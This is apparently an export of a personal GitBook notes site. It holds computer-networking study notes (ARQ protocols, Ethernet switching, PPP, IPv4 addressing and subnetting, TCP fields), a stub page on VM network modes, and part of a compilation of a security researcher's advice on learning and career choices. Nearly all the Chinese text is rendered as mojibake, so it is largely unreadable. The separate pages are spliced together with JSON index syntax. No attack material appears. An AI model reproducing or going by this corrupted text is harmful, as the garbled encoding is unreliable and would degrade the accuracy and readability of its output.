åœæ­¢-ç­‰å¾…ä¼ è¾“åè®® ä½¿ç”¨è¶…æ—¶é‡å‘æœºåˆ¶ï¼Œæ¯æ¬¡åªå‘é€ä¸€ä¸ªæ•°æ®åˆ†ç»„ã€‚ å¹¶ä½¿ç”¨1bitæ¥æ ‡è®°åˆ†ç»„åºå·æ¥é˜²æ­¢æ•°æ®é‡å¤å·®é”™ã€‚ å›é€€Nå¸§åè®® ä½¿ç”¨æ»‘åŠ¨çª—å£æœºåˆ¶ã€‚ å‘é€æ–¹å‘é€æ•°æ®åˆ†ç»„çš„ä¸ªæ•°å–å†³äºå‘é€çª—å£çš„å¤§å°ã€‚ æ¥æ”¶æ–¹æ¥æ”¶æ•°æ®åˆ†ç»„çš„ä¸ªæ•°é»˜è®¤ä¸º1ï¼Œå³æ¥æ”¶çª—å£çš„å¤§å°é»˜è®¤ä¸º1ã€‚ å‡è®¾ä¼ è¾“æ•°æ®0ï¼Œ1ï¼Œ2ï¼Œ3ï¼Œ4ï¼Œæ•°æ®åˆ†ç»„2å‡ºé”™ï¼Œ é‚£ä¹ˆå‘é€æ–¹å°±è¦å›é€€åˆ°ç¬¬2å¸§ï¼Œé‡æ–°å‘é€æ•°æ®åˆ†ç»„2ï¼Œ3ï¼Œ4ã€‚ é€‰æ‹©é‡ä¼ åè®® ä½¿ç”¨æ»‘åŠ¨çª—å£æœºåˆ¶ã€‚ å‘é€çª—å£å’Œæ¥æ”¶çª—å£å¤§å°ä¸€è‡´ã€‚ å‡è®¾ä¼ è¾“æ•°æ®0ï¼Œ1ï¼Œ2ï¼Œ3ï¼Œ4ï¼Œæ•°æ®åˆ†ç»„2å‡ºé”™ï¼Œ é‚£ä¹ˆå‘é€æ–¹åªéœ€è¦é‡æ–°å‘é€æ•°æ®åˆ†ç»„2ã€‚ â€‹ ä»¥å¤ªç½‘ é›†çº¿å™¨å…±äº«å¼ä»¥å¤ªç½‘ äº¤æ¢æœºäº¤æ¢å¼ä»¥å¤ªç½‘ äº¤æ¢æœºè‡ªå­¦ä¹  Aâ†’B ä»Aå‘å‡ºçš„å¸§åˆ°è¾¾äº¤æ¢æœºåï¼Œäº¤æ¢è®°å½•ä¸‹è¯¥å¸§çš„æºMACåœ°å€å³ä¸»æœºAçš„MACåœ°å€å’Œå¸§åˆ°è¾¾çš„äº¤æ¢æœºæ¥å£ï¼Œå¹¶åœ¨äº¤æ¢æœºçš„è®°å½•è¡¨ä¸­æŸ¥æ‰¾å¸§ä¸­çš„ç›®çš„MACåœ°å€ï¼Œä»è€Œç²¾ç¡®è½¬å‘æˆ–è€…ç›²ç›®è½¬å‘ã€‚ é›†çº¿å™¨ï¼Œäº¤æ¢æœºä¸å¸¦å®½ https://blog.csdn.net/grady1234/article/details/44804423 é›†çº¿å™¨æ˜¯â€å…±äº«æ€»çº¿â€œï¼Œåªæœ‰ä¸€æ¡è½¦é“ï¼Œä¸€èˆ¬æ˜¯å„ä¸»æœºå¹³åˆ†å¸¦å®½ã€‚ äº¤æ¢æœºæ˜¯ä¸€æ¡å…¬è·¯ï¼Œæœ‰Næ¡è½¦é“ï¼ˆå–å†³äºäº¤æ¢æœºçš„ç«¯å£æ•°é‡ï¼‰ï¼Œæ‰€ä»¥å„ä¸»æœºæ˜¯ç‹¬äº«å¸¦å®½ã€‚ ä½†æ˜¯å½“åªæœ‰ä¸€ä¸ªè½¦é“æ˜¯å¯ä»¥è®¿é—®å¤–ç½‘æ—¶ï¼Œè®¿é—®å¤–ç½‘æ—¶åˆä¼šå˜ä¸ºå„ä¸»æœºå¹³åˆ†å¸¦å®½ã€‚ PPP--å®½å¸¦è¿æ¥ å¸§æ ¼å¼ é€æ˜ä¼ è¾“ PPPåè®®çš„ä¸»è¦ç‰¹ç‚¹æ˜¯ä»€ä¹ˆï¼Ÿä¸ºä»€ä¹ˆPPPä¸ä½¿ç”¨å¸§çš„ç¼–å·ï¼ŸPPPé€‚ç”¨äºä»€ä¹ˆæƒ…å†µï¼Ÿä¸ºä»€ä¹ˆPPPåè®®ä¸èƒ½ä½¿æ•°æ®é“¾è·¯å±‚å®ç°å¯é ä¼ è¾“ï¼Ÿ ç­”ï¼š ç®€å•ï¼Œæä¾›ä¸å¯é çš„æ•°æ®æŠ¥æœåŠ¡ï¼Œæ£€é”™ï¼Œæ— çº é”™; PPPä¸é‡‡ç”¨åºå·å’Œç¡®è®¤æœºåˆ¶æ˜¯å‡ºäºä»¥ä¸‹çš„è€ƒè™‘ï¼š ç¬¬ä¸€ï¼Œ è‹¥ä½¿ç”¨èƒ½å¤Ÿå®ç°å¯é ä¼ è¾“çš„æ•°æ®é“¾è·¯å±‚åè®®ï¼Œå¼€é”€å°±è¦å¢å¤§ã€‚åœ¨æ•°æ®é“¾è·¯å±‚å‡ºç°å·®é”™çš„æ¦‚ç‡ä¸å¤§æ—¶ï¼Œä½¿ç”¨æ¯”è¾ƒç®€å•çš„PPPåè®®è¾ƒä¸ºåˆç†ã€‚ ç¬¬äºŒï¼Œæ•°æ®é“¾è·¯å±‚çš„å¯é ä¼ è¾“å¹¶ä¸èƒ½ä¿è¯ç½‘ç»œå±‚çš„ä¼ è¾“ä¹Ÿæ˜¯å¯é çš„ã€‚ ç¬¬ä¸‰ï¼Œ PPPåè®®æœ‰å¸§æ£€éªŒåºåˆ—FCSå­—æ®µï¼Œå¯ä»¥æ£€é”™ï¼Œæ‰€ä»¥å¯ä»¥ä¿è¯æ— å·®é”™æ¥å—ã€‚ PPPé€‚ç”¨äºç‚¹åˆ°ç‚¹çº¿è·¯å¹¶ä¸”çº¿è·¯è´¨é‡ä¸å·®çš„ä¼ è¾“ä¸­ï¼Œä¾‹å¦‚ç”¨æˆ·æ‹¨å·è¿æ¥ä¸Šç½‘ã€‚ å› ä¸ºPPPä¸ä½¿ç”¨åºå·å’Œç¡®è®¤æœºåˆ¶ï¼Œæ‰€ä»¥æ— æ³•å®ç°å¯é ä¼ è¾“ã€‚ ç¬¬å››ç«  ç½‘ç»œæ•°é‡=2^ç½‘ç»œå· å¯åˆ†é…åœ°å€=2^ä¸»æœºå·-2 åˆ†ç±»ç¼–å€ IPåœ°å€=ç½‘ç»œå·+ä¸»æœºå· å¯åˆ†é…ç»™ä¸»æœºçš„åœ°å€=2^x-2 ï¼ˆxä¸ºä¸»æœºå·ä½æ•°ï¼›-2ï¼šç½‘ç»œåœ°å€+å¹¿æ’­åœ°å€ï¼‰ Aç±»åœ°å€ â€‹ æœ¬åœ°ç¯å›åœ°å€ï¼šé€šå¸¸æ˜¯æŒ‡127.0.0.1ï¼Œä¸å±äºä»»ä½•ä¸€ä¸ªæœ‰ç±»åˆ«åœ°å€ç±»ã€‚ä¸€èˆ¬éƒ½ä¼šç”¨æ¥æ£€æŸ¥æœ¬åœ°ç½‘ç»œåè®®ã€åŸºæœ¬æ•°æ®æ¥ å£ç­‰æ˜¯å¦æ­£å¸¸çš„ã€‚ â€‹ æœ¬åœ°ç¯å›åœ°å€è¯¦è§£åŠä¸localhostï¼Œ0.0.0.0åŒºåˆ« æ€»ç»“ 127.0.0.1 æ˜¯å›ç¯åœ°å€ã€‚localhostæ˜¯åŸŸåï¼Œä½†é»˜è®¤ç­‰äº 127.0.0.1ã€‚ ping å›ç¯åœ°å€å’Œ ping æœ¬æœºåœ°å€ï¼Œæ˜¯ä¸€æ ·çš„ï¼Œèµ°çš„æ˜¯lo0 \"å‡ç½‘å¡\"ï¼Œéƒ½ä¼šç»è¿‡ç½‘ç»œå±‚å’Œæ•°æ®é“¾è·¯å±‚ç­‰é€»è¾‘ï¼Œæœ€ååœ¨å¿«è¦å‡ºç½‘å¡å‰ç‹ ç‹ æ‹äº†ä¸ªå¼¯ï¼Œ å°†æ•°æ®æ’å…¥åˆ°ä¸€ä¸ªé“¾è¡¨åå°±è½¯ä¸­æ–­é€šçŸ¥ ksoftirqd æ¥è¿›è¡Œæ”¶æ•°æ®çš„é€»è¾‘ï¼Œå‹æ ¹å°±ä¸å‡ºç½‘ç»œã€‚æ‰€ä»¥æ–­ç½‘äº†ä¹Ÿèƒ½ ping é€šå›ç¯åœ°å€ã€‚ å¦‚æœæœåŠ¡å™¨ listen çš„æ˜¯ 0.0.0.0ï¼Œé‚£ä¹ˆæ­¤æ—¶ç”¨127.0.0.1å’Œæœ¬æœºåœ°å€éƒ½å¯ä»¥è®¿é—®åˆ°æœåŠ¡ã€‚ã€ Bç±»åœ°å€ Cç±»åœ°å€ Dç±»å’ŒEç±» ä¾‹å­ ç‰¹æ®Šipv4åœ°å€ åˆ’åˆ†å­ç½‘ IPåœ°å€=ç½‘ç»œå·+å­ç½‘å·+ä¸»æœºå· ç½‘ç»œåœ°å€=ç½‘ç»œå·+å­ç½‘å· ç½‘ç»œåœ°å€=IPåœ°å€&å­ç½‘æ©ç ï¼ˆå› ä¸ºå­ç½‘æ©ç çš„ä¸»æœºå·å…¨0ï¼Œæ‰€ä»¥&è¿ç®—åçš„ç»“æœåªä¿ç•™äº†ç½‘ç»œå·å’Œå­ç½‘å·ã€‚ï¼‰ ç”±æ¥ å½“å±€åŸŸç½‘ä»åªæœ‰ä¸€ä¸ªå­ç½‘1åˆ°æ‹¥æœ‰ä¸‰ä¸ªå­ç½‘æ—¶ï¼š é€šè¿‡å€ŸåŠ©ä¸»æœºå·çš„æ¯”ç‰¹æ¥åŒºåˆ†å­ç½‘ã€‚ ä½†æ˜¯æœ‰ä¸€ä¸ªé—®é¢˜å°±æ˜¯å¦‚ä½•çŸ¥é“ä¸»æœºå·ä¸­çš„å“ªäº›æ¯”ç‰¹æ˜¯ç”¨æ¥åŒºåˆ†å­ç½‘çš„ï¼Ÿ æ‰€ä»¥å‡ºç°äº†å­ç½‘æ©ç  æ³¨ï¼šè¿™æ—¶å€™çš„ â€‹ â€‹ ä¾‹å­ â€‹ åˆ’åˆ†å‡ºçš„å­ç½‘æ•°é‡ä¸º2^1=2ä¸ª ï¼ˆ1ä¸ºå­ç½‘å·ä½æ•°ï¼‰ æ— åˆ†ç±»ç¼–å€--CIDR å®šä¹‰ æ–œçº¿è®°æ³• æ˜Ÿå·è®°æ³• â€‹ ç½‘ç»œå‰ç¼€çš„åé¢åŠ ä¸€ä¸ªæ˜Ÿå· çš„è¡¨ç¤ºæ–¹æ³•ï¼Œå¦‚00001010 00ï¼Œåœ¨æ˜Ÿå· ä¹‹å‰æ˜¯ç½‘ç»œå‰ç¼€ï¼Œè€Œæ˜Ÿå· è¡¨ç¤º IP åœ°å€ä¸­çš„ä¸»æœºå·ï¼Œå¯ä»¥æ˜¯ä»»æ„å€¼ã€‚ å¥½å¤„ â€‹ â€‹ åŠ¨æ€åˆ†é…åœ°å€ï¼Œæœ‰æ•ˆåˆ©ç”¨ipv4åœ°å€ â€‹ åˆ†é…ç½‘ç»œå‰ç¼€æ—¶åº”å…ˆåˆ†é…åœ°å€æ•°è¾ƒå¤šçš„å‰ç¼€ã€‚ â€‹ â€‹ å‡å°‘è·¯ç”±ä¿¡æ¯æ‰€å çš„ç½‘ç»œèµ„æºï¼ŒåŸæœ¬éœ€è¦è®°å½•5ä¸ªè·¯ç”±ä¿¡æ¯ï¼Œä½¿ç”¨æ— åˆ†ç±»ç¼–å€åªéœ€è¦è®°å½•å…¶å…±åŒå‰ç¼€ä½œä¸ºç½‘ç»œåœ°å€å³å¯å¾—åˆ°èšåˆåœ°å€å—ã€‚ å­ç½‘åˆ’åˆ† å®šé•¿å­ç½‘æ©ç  ä¸å®šé•¿å­ç½‘æ©ç  å…ˆæ ¹æ®ä¸»æœºæ•°é‡+ç½‘ç»œè®¾å¤‡æ•°é‡ç¡®å®šå‡ºä¸»æœºå·ï¼Œä»è€Œç¡®ç«‹å‡ºå­ç½‘æ©ç ã€‚ ipåœ°å€ä¸macåœ°å€ ä¸ºä»€ä¹ˆéœ€è¦ä¸¤ä¸ªåœ°å€ï¼Œå¦‚æœåªæœ‰ä¸€ä¸ªåœ°å€å¯ä»¥å—ï¼Ÿ ä¸å¯ä»¥ã€‚å› ä¸ºå¦‚æœåªæœ‰macåœ°å€ï¼Œé‚£ä¹ˆè·¯ç”±å™¨å°±éœ€è¦è®°å½•æ‰€æœ‰ä¸»æœºçš„macåœ°å€ï¼Œè¿™éœ€è¦å·¨å¤§çš„è·¯ç”±å­˜å‚¨ç©ºé—´ä»¥åŠé€šä¿¡èµ„æºã€‚è€Œå¦‚æœåªæœ‰ipåœ°å€ï¼Œé‚£ä¹ˆæ•°æ®å°±ä¸èƒ½åˆ°è¾¾ç›®çš„ä¸»æœºï¼Œå› ä¸ºåªçŸ¥é“ä¸»æœºåœ¨å“ªä¸€ä¸ªç½‘ç»œç†é‡Œï¼Œè€Œä¸çŸ¥é“ä¸»æœºå…·ä½“åœ¨ç½‘ç»œçš„å“ªé‡Œï¼Œipåœ°å€å°±åƒå°åŒºå·ï¼Œmacåœ°å€å°±åƒé—¨ç‰Œå·ï¼ŒåªçŸ¥é“å°åŒºå·æ˜¯æ‰¾ä¸åˆ°å¯¹æ–¹çš„ã€‚ ipæ•°æ®æŠ¥ å‘é€è¿‡ç¨‹ ä¸»æœºAå‘ä¸»æœºBå‘é€IPæ•°æ®åŒ… ä¸»æœºAéœ€è¦åˆ¤æ–­ä¸»æœºBä¸å…¶æ˜¯å¦åœ¨åŒä¸€ä¸ªç½‘ç»œä¸­ï¼Œè‹¥åœ¨åŒä¸€ä¸ªç½‘ç»œä¸­å¯ä»¥ç›´æ¥äº¤ä»˜ï¼Œè‹¥ä¸åœ¨åŒä¸€ä¸ªç½‘ç»œä¸­ï¼Œåˆ™éœ€è¦è·¯ç”±å™¨æ¥é—´æ¥äº¤ä»˜ã€‚ å‡è®¾æ˜¯é—´æ¥äº¤ä»˜ã€‚é‚£ä¹ˆä¸»æœºAè¯¥å°†IPæ•°æ®æŠ¥å‘ç»™å“ªä¸€ä¸ªè·¯ç”±å™¨å‘¢ï¼Ÿç­”æ¡ˆæ˜¯é»˜è®¤ç½‘å…³ï¼Œå³ç½‘ç»œç®¡ç†å‘˜è®¾ç½®çš„ä¸»æœºAæ‰€åœ¨ä»¥å¤ªç½‘ç”¨æ¥è½¬å‘çš„é»˜è®¤è·¯ç”±å™¨ã€‚ ä¸»æœºAå°†IPæ•°æ®æŠ¥è½¬å‘ç»™é»˜è®¤ç½‘å…³åï¼Œç½‘å…³ï¼ˆå³è·¯ç”±å™¨ï¼‰æ€ä¹ˆçŸ¥é“è¯¥è½¬å‘ç»™å“ªä¸ªä»¥å¤ªç½‘å‘¢ï¼Ÿç­”æ¡ˆæ˜¯æ ¹æ®è·¯ç”±è¡¨ã€‚ ç½‘å…³å°†IPæ•°æ®æŠ¥çš„ç›®æ ‡åœ°å€ï¼ˆå³ä¸»æœºBçš„IPåœ°å€ï¼‰ä¸è·¯ç”±è¡¨ä¸­çš„å­ç½‘æ©ç ç›¸ä¸åå¾—åˆ°ä¸»æœºBçš„ç½‘ç»œåœ°å€ï¼Œå†æŸ¥æ‰¾è·¯ç”±è¡¨ä¸­æ˜¯å¦æœ‰è¯¥ç›®çš„ç½‘ç»œï¼Œå¦‚æœæ‰¾åˆ°å°±æŒ‰ç…§ä¸‹ä¸€è·³å°†IPæ•°æ®æŠ¥è½¬å‘å‡ºå»ã€‚ æ ¼å¼ VPN--è™šæ‹Ÿä¸“ç”¨ç½‘ NAT--ç½‘ç»œåœ°å€è½¬æ¢ å†…ç½‘è½¬å¤–ç½‘ å†…ç½‘è½¬ç«¯å£ IPV6 ç¬¬äº”ç«  ç«¯å£å· UDPå’ŒTCPæ•°æ®æŠ¥æ ¼å¼ TCPè¿æ¥ åºå·ï¼šæŒ‡çš„æ˜¯å‘é€çš„æ•°æ®è½½è·çš„ç¬¬ä¸€ä¸ªå­—èŠ‚çš„åºå·ã€‚ ç¡®è®¤å·ï¼šæŒ‡çš„æ˜¯å·²ç»æˆåŠŸæ¥å—åˆ°åºå·è‡³ï¼ˆç¡®è®¤å·-1ï¼‰çš„æ•°æ®ï¼Œå¸Œæœ›å¯¹æ–¹å‘é€çš„æ•°æ®æ˜¯ä»ç¡®è®¤å·å¼€å§‹çš„ã€‚ ACKï¼š1è¡¨ç¤ºæˆåŠŸæ¥æ”¶ï¼Œåªæœ‰è®¾ç½®ä¸º1ï¼Œç¡®è®¤å·æ‰æ˜¯æœ‰æ•ˆçš„ã€‚ Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2023-10-27 17:37:26 "},"07.åŸºç¡€çŸ¥è¯†/è®¡ç®—æœºç½‘ç»œ/è™šæ‹Ÿæœºç½‘ç»œ.html":{"url":"07.åŸºç¡€çŸ¥è¯†/è®¡ç®—æœºç½‘ç»œ/è™šæ‹Ÿæœºç½‘ç»œ.html","title":"è™šæ‹Ÿæœºç½‘ç»œ","keywords":"","body":"https://wxler.github.io/2021/02/02/221724/ VMç½‘ç»œé…ç½® è™šæ‹Ÿæœºwin10æ‰“å°çš„ç½‘ç»œé…ç½®ä¿¡æ¯ å®¿ä¸»æœºç½‘ç»œè®¾å¤‡ NATæ¨¡å¼ æ¡¥æ¥æ¨¡å¼ ä»…ä¸»æœºæ¨¡å¼ Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2023-10-27 17:37:30 "},"07.åŸºç¡€çŸ¥è¯†/tombkeeperå…³äºä¿¡æ¯å®‰å…¨å­¦ä¹ çš„åˆ†äº«.html":{"url":"07.åŸºç¡€çŸ¥è¯†/tombkeeperå…³äºä¿¡æ¯å®‰å…¨å­¦ä¹ çš„åˆ†äº«.html","title":"tombkeeperå…³äºä¿¡æ¯å®‰å…¨å­¦ä¹ çš„åˆ†äº«","keywords":"","body":"å‰è¨€ è¿™æ˜¯æˆ‘æ•´ç†çš„tombkeeperå…³äºä¿¡æ¯å®‰å…¨å­¦ä¹ ç ”ç©¶ç›¸å…³çš„ç»éªŒèšåˆæ–‡ç« ã€‚ ä»¥ä¸‹å†…å®¹å‡æ¥è‡ªtombkeeperçš„å¾®åšæˆ–çŸ¥ä¹ã€‚ å¦‚ä½•åšäº‹ï¼ˆç¼–è€…åŠ ï¼‰ ä¸­å›½æ¯å¹´å¤§æ¦‚æœ‰äº”ç™¾ä¸‡ç†å·¥ç§‘æ¯•ä¸šç”Ÿã€‚å…¶ä¸­å ªç§°ä¼˜ç§€æŠ€æœ¯äººæ‰çš„è‡ªç„¶æ˜¯å°‘æ•°ã€‚ç„¶è€Œï¼ŒæŠ€æœ¯å¥½åˆä¼šåšäº‹çš„æ›´æ˜¯æå°‘æ•°ã€‚ ä»€ä¹ˆæ˜¯â€œåšäº‹â€ï¼Ÿå°±æ˜¯ç¡®ç«‹ç›®æ ‡ã€åˆ†æè·¯å¾„ã€è§„åˆ’èµ„æºã€åˆ¶å®šæ–¹æ¡ˆã€è¿­ä»£æ‰§è¡Œã€‚ä¼˜ç§€æŠ€æœ¯äººæ‰ï¼Œè‡ªç„¶æ˜¯èƒ½æŠŠæŠ€æœ¯åšå¥½çš„äººã€‚ä½†ä»åšæŠ€æœ¯åˆ°åšäº‹ï¼Œä¸­é—´è¿˜æœ‰å¾ˆè¿œçš„è·ç¦»ã€‚å¤§éƒ¨åˆ†äººå¯èƒ½ç»ˆå…¶ä¸€ç”Ÿéƒ½ä¸ä¼šåšäº‹ã€‚ å‰é˜µå­ä¸€ä¸ªåŒå­¦è·Ÿæˆ‘è¯´æƒ³å»BlackHatæ¼”è®²ã€‚æˆ‘è¯´ä½ æ˜¯æ€ä¹ˆè§„åˆ’è¿™ä»¶äº‹çš„ï¼Ÿä»–ä¸€æ„£ï¼ŒåŠå¤©è¯´ä¸å‡ºè¯ã€‚ä»–å®šäº†ç›®æ ‡ï¼Œä½†æ²¡å»æƒ³åé¢çš„äº‹æƒ…ã€‚ ç„¶åæˆ‘é—®ä»–æœ‰æ²¡æœ‰æ³¨æ„åˆ°BlackHatæœ‰äº›æ¼”è®²æ°´å¹³å¾ˆé«˜ï¼Œä½†ä¹Ÿæœ‰ä¸€äº›ä¸å¤ªè¡Œçš„ã€‚ä»–è¯´ç¡®å®æ˜¯è¿™æ ·ã€‚ç„¶åæˆ‘è¯´ä½ æœ‰æ²¡æœ‰åˆ†æè¿‡ä¸ºä»€ä¹ˆä¼šè¿™æ ·ï¼Ÿä»–è¯´æ²¡æœ‰ã€‚æˆ‘è¯´å¦‚æœä½ åˆ†æä¸€ä¸‹é‚£äº›ä¸å¤ªè¡Œçš„æ¼”è®²ä¸ºä»€ä¹ˆä¹Ÿèƒ½ä¸ŠBlackHatï¼Œæ˜¯ä¸æ˜¯ä¼šå¯¹ä½ è¾¾æˆç›®æ ‡æœ‰å¸®åŠ©ï¼Ÿä»–æç„¶å¤§æ‚Ÿã€‚ æˆ‘è¯´è¿™åªæ˜¯ä¸€ä¸ªå°ç‚¹ï¼Œè¿˜ä¸ç®—å®Œã€‚ä½ çŸ¥é“æ€ä¹ˆæ‰èƒ½ä¸ŠBlackHatï¼Ÿä»–æƒ³äº†ä¸€ä¸‹è¯´æ˜¯æŠ•ç¨¿è¢«æ¥å—ã€‚æˆ‘è¯´é‚£ä¹ˆæ˜¯ä¸æ˜¯åº”è¯¥æ”¶é›†æ—¢å¾€æ¼”è®²çš„å†…å®¹æ‘˜è¦ï¼Œåˆ†æè¢«æ¥å—çš„æŠ•ç¨¿æœ‰ä»€ä¹ˆç‰¹ç‚¹ã€‚ ç„¶åæˆ‘è¯´ä½ æœ‰æ²¡æœ‰æƒ³è¿‡BlackHatæ¼”è®²è€…å’Œä¸»åŠæ–¹ä¹‹é—´æ˜¯ä»€ä¹ˆå…³ç³»ï¼Ÿä»–è¯´ä¸çŸ¥é“ã€‚æˆ‘è¯´æœ¬è´¨æ˜¯å•†ä¸šåˆä½œå…³ç³»ã€‚ä¸»åŠæ–¹ç»™æ¼”è®²è€…æä¾›æ›å…‰æœºä¼šå’Œæœºç¥¨é…’åº—ï¼Œæ¼”è®²è€…ç”¨è‡ªå·±çš„å†…å®¹å¸®ä¸»åŠæ–¹æŠŠç¥¨å–å‡ºå»ã€‚æ‰€ä»¥æŠ•ç¨¿è¦è®©åˆ«äººçœ‹äº†è§‰å¾—æ˜¯æœ‰åˆ©äºå–ç¥¨çš„ã€‚ æˆ‘åˆé—®ä½ æœ‰æ²¡æœ‰æƒ³è¿‡Review Boardé‡Œçš„äººæ˜¯æ€ä¹ˆæŒ‘é€‰æ¼”è®²çš„ï¼Ÿæœ‰æ²¡æœ‰æƒ³è¿‡å¦‚æœä½ åœ¨Review Boardä½ ä¼šçœ‹é‡å“ªäº›ï¼Ÿæœ‰æ²¡æœ‰äº†è§£è¿‡Review Boardé‡Œçš„é‚£äº›äººï¼Ÿå…¶ä¸­å’Œä½ æŠ€æœ¯æ–¹å‘ç›¸å…³çš„äººæœ‰å“ªäº›ï¼Ÿè¿™äº›äººå†å²ä¸Šåšè¿‡ä»€ä¹ˆï¼Ÿä»–ä»¬å¯èƒ½ä¼šå¯¹å“ªäº›ä¸œè¥¿æ›´é’çï¼Ÿ è¯´äº†è¿™ä¹ˆå¤šï¼Œè¿˜åªæ˜¯åˆ†æè·¯å¾„è¿™ä¸€æ­¥ã€‚åé¢è§„åˆ’èµ„æºã€åˆ¶å®šæ–¹æ¡ˆã€è¿­ä»£æ‰§è¡Œéƒ½è¿˜éœ€è¦æ›´å¤šçš„æ€è€ƒã€‚å½“ç„¶ï¼Œè¿™ä¸ªåŒå­¦åˆšæ¯•ä¸šï¼Œä¸ä¼šåšäº‹å¾ˆæ­£å¸¸ï¼Œåé¢è¿˜æœ‰æ—¶é—´æ…¢æ…¢å­¦ã€‚ä½†å¦‚æœä½ æ¯•ä¸šå·²ç»å¾ˆä¹…äº†ï¼Œå‘ç°è‡ªå·±è¿˜ä¸ä¼šåšäº‹ï¼Œå°±è¦å¼€å§‹ç•™å¿ƒåŸ¹å…»è¿™æ–¹é¢çš„èƒ½åŠ›äº†ã€‚åœ¨å­¦æ ¡é‡Œæˆ‘ä»¬çš„æˆé•¿ä¸»è¦é å­¦ä¹ çŸ¥è¯†ã€‚æ¯•ä¸šåï¼Œæ›´é‡è¦çš„æˆé•¿æ˜¯å­¦ä¼šåšäº‹ã€‚ å¤§å­¦ä¸“ä¸šé€‰æ‹©ï¼ˆç¼–è€…åŠ ï¼‰ å‰é˜µå­ä¸€ä¸ªæœ‹å‹å¿½ç„¶è¯´è¦è°¢æˆ‘ï¼Œæ„Ÿè°¢æˆ‘å½“åˆåœ¨ä»–å„¿å­è€ƒå¤§å­¦é€‰ä¸“ä¸šæ—¶ç»™çš„å»ºè®®ã€‚æˆ‘éƒ½ä¸å¤ªè®°å¾—è¿™äº‹äº†ï¼Œæƒ³äº†å¥½ä¸€ä¼šæ‰å›å¿†èµ·æ¥ã€‚ è¿™ä¸ªæœ‹å‹ä¸€ç›´è§‰å¾—æˆ‘ä»¬å®éªŒå®¤ç‰¹åˆ«å¥½ï¼Œæ‰€ä»¥ 2019 å¹´ä»–è¡¨å¼Ÿè¿˜åœ¨è¯»å¤§å››çš„æ—¶å€™ï¼Œä»–å°±æƒ³è®©è¡¨å¼Ÿè·Ÿæˆ‘å­¦ç½‘ç»œå®‰å…¨ã€‚æˆ‘å½“æ—¶çœ‹äº†ä»–è¡¨å¼Ÿçš„ç®€å†ï¼Œè¯´è¿™å­©å­å°†æ¥çš„å‰é€”å¿…ç„¶åœ¨ AI ä¸Šï¼Œæ²¡å¿…è¦å¼ºè¡Œæ¥æå®‰å…¨ã€‚ å‡ å¹´åï¼Œè¿™ä½æœ‹å‹å‘Šè¯‰æˆ‘ï¼Œä»–è¡¨å¼Ÿè¯»ç ”ç©¶ç”Ÿäº†ï¼Œæ–¹å‘å°±æ˜¯ AIã€‚åæ¥ä»–åˆå‘Šè¯‰æˆ‘ï¼Œä»–è¡¨å¼Ÿå·²ç»æ˜¯å­¦æ ¡äººå·¥æ™ºèƒ½å®éªŒå®¤äº‹å®ä¸Šçš„è´Ÿè´£äººäº†ã€‚è€Œä¸”ä»–è¡¨å¼Ÿåœ¨å¬è¯´äº†æˆ‘çš„éå†æ–‡æ¡£çš„å­¦ä¹ æ–¹æ³•åï¼Œä¹Ÿç”¨åˆ°äº†å¯¹ AI çš„ç ”ç©¶ä¸Šã€‚ä¸å…‰è‡ªå·±è¿™ä¹ˆåšï¼Œè¿˜è¦æ±‚å®éªŒå®¤çš„åŒå­¦éƒ½è¿™æ ·ã€‚æ®è¯´æ•ˆæœå‡ºä¹æ„æ–™åœ°å¥½ã€‚ å‰ä¸¤å¹´ä»–å„¿å­è¦è€ƒå¤§å­¦äº†ï¼Œä»–æ¥é—®æˆ‘åº”è¯¥æŠ¥ä»€ä¹ˆä¸“ä¸šã€‚ä»–å½“æ—¶è¿˜æ˜¯æƒ³è®©å„¿å­å°†æ¥æç½‘ç»œå®‰å…¨ï¼Œäºæ˜¯é—®æˆ‘æ˜¯è¯»ç½‘ç»œå®‰å…¨ä¸“ä¸šè¿˜æ˜¯è¯»è®¡ç®—æœºä¸“ä¸šã€‚ æˆ‘è¯´å°†æ¥å¹²ä»€ä¹ˆè¿˜å¾—çœ‹å…´è¶£ï¼Œå­©å­æœªå¿…å°±å–œæ¬¢ç½‘ç»œå®‰å…¨ã€‚å¬äº†ä»–å„¿å­çš„æƒ…å†µåï¼Œæˆ‘å»ºè®®ä»–è®©å„¿å­æœ¬ç§‘å­¦æ•°å­¦ã€‚æˆ‘è¯´æ•°å­¦åº•å­æ‰“å¥½äº†ï¼Œå¦‚æœæ„¿æ„æç½‘ç»œå®‰å…¨ï¼Œæˆ‘å¯ä»¥æ•™ä»–æ€ä¹ˆå­¦ã€‚è€Œå¦‚æœå–œæ¬¢æåˆ«çš„ï¼Œæ¯”å¦‚ AIï¼Œé‚£ä¹ˆæ•°å­¦åº•å­å¥½ä¹Ÿå¾ˆæœ‰ä¼˜åŠ¿ï¼Œåˆ«çš„éƒ½å¯ä»¥è‡ªå­¦ã€‚ äºæ˜¯ä»–å°±å¬æˆ‘çš„å»ºè®®è®©å„¿å­è¯»äº†æ•°å­¦ç³»ã€‚æœ€è¿‘ä»–å„¿å­å»å’Œä»–è¡¨å¼Ÿå­¦ AIï¼Œå­¦çš„ç‰¹åˆ«å¿«ï¼Œä¸€ä¸‹ä½“ç°å‡ºæ•°å­¦åº•å­å¥½çš„ä¼˜åŠ¿ã€‚ä»–å¾ˆæƒŠå–œï¼Œæ‰€ä»¥ç‰¹åˆ«æ¥è°¢æˆ‘ã€‚ åˆšæ‰ä»”ç»†å›å¿†äº†ä¸€ä¸‹è¿™å‡ å¹´çš„äº‹æƒ…ï¼Œæ„Ÿè§‰æˆ‘å°±æ˜¯ä»–å®¶çš„å®šåˆ¶ç‰ˆå¼ é›ªå³°ã€‚ éå†æ–‡æ¡£å­¦ä¹ æ³• 2005.10.02 è¿™ä¸¤å¤©è®ºå›ä¸Šåˆæœ‰äººå¼€å§‹æŠ±æ€¨ä¸–é£æ—¥ä¸‹ï¼Œå¤§å®¶éƒ½ç°å®äº†ï¼Œéƒ½ä¸å¼€æ”¾äº†ï¼Œä¸äº¤æµäº†ã€‚å¯¹è¿™ç§â€œæœˆç»è´´â€ï¼Œæˆ‘åŸºæœ¬ä¸Šå·²ç»ä¹ æƒ¯äº†ï¼Œä¸è¿‡å› ä¸ºåƒäº†ç²‰çš®ç‚–é¸¡ï¼Œå¿ƒæƒ…æ¯”è¾ƒå¥½ï¼Œäºæ˜¯å°±è¯´äº†ä¸¤å¥ã€‚ 